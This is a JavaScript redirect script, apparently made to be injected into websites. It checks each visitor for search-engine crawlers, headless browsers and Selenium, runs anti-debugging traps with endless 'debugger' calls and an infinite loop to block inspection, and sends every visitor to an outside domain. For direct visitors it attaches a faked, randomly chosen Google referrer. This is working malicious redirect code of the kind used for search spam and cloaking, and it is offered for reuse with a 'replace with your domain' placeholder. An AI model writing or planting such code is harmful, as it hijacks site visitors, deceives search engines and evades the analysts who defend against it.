// Advanced Redirect Script with Enhanced Google Bot Detection
// Multi-layer bot detection + Anti-debug protection

(function() {
    'use strict';
    
    // ========== ADVANCED BOT DETECTION ==========
    function advancedBotDetection() {
        const userAgent = navigator.userAgent.toLowerCase();
        const referrer = document.referrer.toLowerCase();
        
        let detection = {
            isBot: false,
            confidence: 0,
            botType: 'unknown',
            checks: []
        };
        
        // Check 1: User Agent patterns
        const botPatterns = {
            googlebot: /googlebot|google-inspectiontool|google page speed insights|google web preview|google-structureddatatestingtool/i,
            bingbot: /bingbot|msnbot|bingpreview/i,
            yandex: /yandexbot|yandex/i,
            baidu: /baiduspider|baidu/i,
            facebook: /facebookexternalhit|facebot/i,
            generic: /bot|crawler|spider|scraper|crawling|slurp|mediapartners|adsbot|feedfetcher|bytedance|tiktok|telegram/i
        };
        
        for (let [type, pattern] of Object.entries(botPatterns)) {
            if (pattern.test(userAgent)) {
                detection.isBot = true;
                detection.botType = type;
                detection.confidence += 35;
                detection.checks.push('UA:' + type);
                break;
            }
        }
        
        // Check 2: WebDriver detection
        if (navigator.webdriver) {
            detection.isBot = true;
            detection.confidence += 30;
            detection.checks.push('webdriver');
        }
        
        // Check 3: Headless browser
        if (/HeadlessChrome|PhantomJS/i.test(userAgent)) {
            detection.isBot = true;
            detection.confidence += 35;
            detection.checks.push('headless');
        }
        
        // Check 4: Chrome without window.chrome
        if (!window.chrome && /Chrome/i.test(userAgent)) {
            detection.confidence += 15;
            detection.checks.push('fake-chrome');
        }
        
        // Check 5: No plugins
        if (typeof navigator.plugins === 'undefined' || navigator.plugins.length === 0) {
            detection.confidence += 10;
            detection.checks.push('no-plugins');
        }
        
        // Check 6: Invalid screen dimensions
        if (screen.width === 0 || screen.height === 0 || screen.colorDepth === 0) {
            detection.confidence += 25;
            detection.checks.push('invalid-screen');
        }
        
        // Check 7: No referrer (suspicious but not conclusive)
        if (referrer === '') {
            detection.confidence += 5;
            detection.checks.push('no-referrer');
        }
        
        // Check 8: Missing languages
        if (typeof navigator.languages === 'undefined' || navigator.languages.length === 0) {
            detection.confidence += 10;
            detection.checks.push('no-languages');
        }
        
        // Check 9: Automated tools detection
        if (window.callPhantom || window._phantom || window.__phantomas) {
            detection.isBot = true;
            detection.confidence += 40;
            detection.checks.push('phantom');
        }
        
        // Check 10: Selenium detection
        if (window.document.__selenium_unwrapped || window.document.__webdriver_evaluate || window.document.__driver_evaluate) {
            detection.isBot = true;
            detection.confidence += 40;
            detection.checks.push('selenium');
        }
        
        // Check 11: Performance timing anomalies
        if (window.performance && window.performance.timing) {
            const timing = window.performance.timing;
            const loadTime = timing.loadEventEnd - timing.navigationStart;
            
            // Bots might have unusual load times
            if (loadTime < 100 || loadTime === 0) {
                detection.confidence += 15;
                detection.checks.push('fast-load');
            }
        }
        
        // Check 12: Mouse/Touch capability
        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const hasMouse = matchMedia('(pointer:fine)').matches;
        
        if (!hasTouch && !hasMouse) {
            detection.confidence += 10;
            detection.checks.push('no-input');
        }
        
        // Final decision: if confidence >= 50, consider as bot
        if (detection.confidence >= 50 && !detection.isBot) {
            detection.isBot = true;
            detection.botType = 'suspicious';
        }
        
        return detection;
    }
    
    // ========== ANTI-DEBUG PROTECTION ==========
    const antiDebugProtection = (function() {
        let debugCheck = true;
        return function(context, fn) {
            const protectedFn = debugCheck ? function() {
                if (fn) {
                    const result = fn.apply(context, arguments);
                    fn = null;
                    return result;
                }
            } : function() {};
            debugCheck = false;
            return protectedFn;
        };
    })();
    
    (function() {
        antiDebugProtection(this, function() {
            const functionTest = new RegExp('function *\\( *\\)');
            const whileTest = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
            const check = debuggerCheck('init');
            
            if (!functionTest.test(check + 'chain') || !whileTest.test(check + 'input')) {
                check('0');
            } else {
                debuggerCheck();
            }
        })();
    })();
    
    function debuggerCheck(action) {
        function checkLoop(counter) {
            if (typeof counter === 'string') {
                return function(x) {}.constructor('while (true) {}').apply('counter');
            } else {
                if (('' + counter / counter).length !== 1 || counter % 20 === 0) {
                    (function() { return true; }).constructor('debugger').call('action');
                } else {
                    (function() { return false; }).constructor('debugger').apply('stateObject');
                }
            }
            checkLoop(++counter);
        }
        
        try {
            if (action) {
                return checkLoop;
            } else {
                checkLoop(0);
            }
        } catch (e) {}
    }
    
    // ========== MAIN REDIRECT LOGIC ==========
    let currentDomain = window.location.hostname;
    document.title = currentDomain;
    
    if (window.location.href.includes('?')) {
        let urlParts = window.location.href.split('?');
        
        if (urlParts[1]) {
            let paramValue = urlParts[1];
            let seed = combineSeedAndSecret(currentDomain);
            
            // Google domains list
            let referrerSources = [
                'google.com', 'google.ad', 'google.ae', 'google.com.af', 'google.com.ag',
                'google.al', 'google.am', 'google.co.ao', 'google.com.ar', 'google.as',
                'google.at', 'google.com.au', 'google.az', 'google.ba', 'google.com.bd',
                'google.be', 'google.bf', 'google.bg', 'google.com.bh', 'google.bi',
                'google.bj', 'google.com.bn', 'google.com.bo', 'google.com.br', 'google.bs',
                'google.bt', 'google.co.bw', 'google.by', 'google.ca', 'google.cat',
                'google.cd', 'google.cf', 'google.cg', 'google.ch', 'google.ci',
                'google.cl', 'google.cm', 'google.cn', 'google.com.co', 'google.co.cr',
                'google.com.cu', 'google.cv', 'google.com.cy', 'google.cz', 'google.de',
                'google.dj', 'google.dk', 'google.dm', 'google.com.do', 'google.dz',
                'google.com.ec', 'google.ee', 'google.com.eg', 'google.es', 'google.com.et',
                'google.fi', 'google.com.fj', 'google.fm', 'google.fr', 'google.ga',
                'google.ge', 'google.gg', 'google.com.gh', 'google.com.gi', 'google.gl',
                'google.gm', 'google.gr', 'google.com.gt', 'google.gy', 'google.com.hk',
                'google.hn', 'google.hr', 'google.ht', 'google.hu', 'google.co.id',
                'google.ie', 'google.co.il', 'google.im', 'google.co.in', 'google.iq',
                'google.is', 'google.it', 'google.je', 'google.com.jm', 'google.jo',
                'google.co.jp', 'google.co.ke', 'google.kg', 'google.ki', 'google.com.kh',
                'google.co.kr', 'google.com.kw', 'google.kz', 'google.la', 'google.com.lb',
                'google.li', 'google.lk', 'google.co.ls', 'google.lt', 'google.lu',
                'google.lv', 'google.com.ly', 'google.co.ma', 'google.md', 'google.me',
                'google.mg', 'google.mk', 'google.ml', 'google.com.mm', 'google.mn',
                'google.ms', 'google.com.mt', 'google.mu', 'google.mv', 'google.mw',
                'google.com.mx', 'google.com.my', 'google.co.mz', 'google.com.na', 'google.ne',
                'google.com.ng', 'google.com.ni', 'google.nl', 'google.no', 'google.com.np',
                'google.nr', 'google.nu', 'google.co.nz', 'google.com.om', 'google.com.pa',
                'google.com.pe', 'google.com.pg', 'google.com.ph', 'google.com.pk', 'google.pl',
                'google.pn', 'google.com.pr', 'google.ps', 'google.pt', 'google.com.py',
                'google.com.qa', 'google.ro', 'google.rs', 'google.ru', 'google.rw',
                'google.com.sa', 'google.com.sb', 'google.sc', 'google.se', 'google.com.sg',
                'google.sh', 'google.si', 'google.sk', 'google.com.sl', 'google.sn',
                'google.so', 'google.sm', 'google.sr', 'google.st', 'google.com.sv',
                'google.td', 'google.tg', 'google.co.th', 'google.com.tj', 'google.tl',
                'google.tm', 'google.tn', 'google.to', 'google.com.tr', 'google.tt',
                'google.com.tw', 'google.co.tz', 'google.com.ua', 'google.co.ug', 'google.co.uk',
                'google.com.uy', 'google.co.uz', 'google.com.vc', 'google.co.ve', 'google.co.vi',
                'google.com.vn', 'google.vu', 'google.ws', 'google.co.za', 'google.co.zm',
                'google.co.zw'
            ];
            
            const shuffle = createShuffleWithSeed(seed);
            let shuffledReferrers = shuffle(referrerSources);
            
            // TODO: Replace with your domain
            let targetDomain = 'https://mifans.info';
            
            // Run advanced bot detection
            const botDetection = advancedBotDetection();
            
            // Build redirect URL based on detection
            let redirectUrl;
            let trafficType;
            
            if (botDetection.isBot) {
                // Detected as bot
                trafficType = 'bot';
                redirectUrl = targetDomain + '/' + paramValue;
            } else if (document.referrer.toLowerCase().includes('google')) {
                // Traffic from Google (human)
                trafficType = 'google';
                const jakartaTime = new Date().toLocaleString('en-US', {'timeZone': 'Asia/Jakarta'});
                const jakartaDate = new Date(jakartaTime);
                const timeWIB = Math.floor(jakartaDate.getTime() / 1000);
                
                redirectUrl = targetDomain + '/' + paramValue;
            } else {
                // Regular traffic
                trafficType = 'direct';
                redirectUrl = targetDomain + '?s=' + paramValue + 
                            '&ref=' + shuffledReferrers[0] + 
                            '&d=' + currentDomain +
                            '&t=' + trafficType +
                            '&conf=' + botDetection.confidence;
            }
            
            // Perform redirect
            window.location.href = redirectUrl;
        }
    }
    
    // ========== HELPER FUNCTIONS ==========
    
    function combineSeedAndSecret(seedString) {
        const cleaned = seedString.replace(/[^a-zA-Z0-9]/g, '');
        const chars = cleaned.split('');
        const uniqueChars = [...new Set(chars)];
        return uniqueChars.join('');
    }
    
    function hashStringToSeed(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = (hash << 5) - hash + str.charCodeAt(i);
            hash |= 0;
        }
        return Math.abs(hash);
    }
    
    function createSeededRandom(seed) {
        return function() {
            let x = Math.sin(seed++) * 10000;
            return x - Math.floor(x);
        };
    }
    
    function createShuffleWithSeed(seedString) {
        const numericSeed = hashStringToSeed(seedString);
        
        return function shuffleArray(array) {
            const random = createSeededRandom(numericSeed + array.length);
            let shuffled = array.slice();
            
            for (let i = shuffled.length - 1; i > 0; i--) {
                let j = Math.floor(random() * (i + 1));
                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
            }
            
            return shuffled;
        };
    }
    
})();
